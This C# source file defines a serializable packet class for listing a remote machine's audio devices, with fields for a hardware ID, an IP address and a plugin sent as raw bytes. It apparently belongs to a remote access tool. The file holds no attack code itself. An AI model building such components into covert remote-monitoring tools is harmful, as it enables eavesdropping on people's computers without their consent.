﻿using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteAudioPacket : IPacket
    {
        public RemoteAudioPacket() : base()
        {
            this.PacketType = PacketType.AUDIO_GET_DEVICES;
        }

        public RemoteAudioPacket(List<string> audioDevices, string baseIp, string HWID) : base()
        {
            this.PacketType = PacketType.AUDIO_GET_DEVICES;
            this.BaseIp = baseIp;
            this.HWID = HWID;

            this.audioDevices = audioDevices;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<string> audioDevices { get; set; }
    }
}
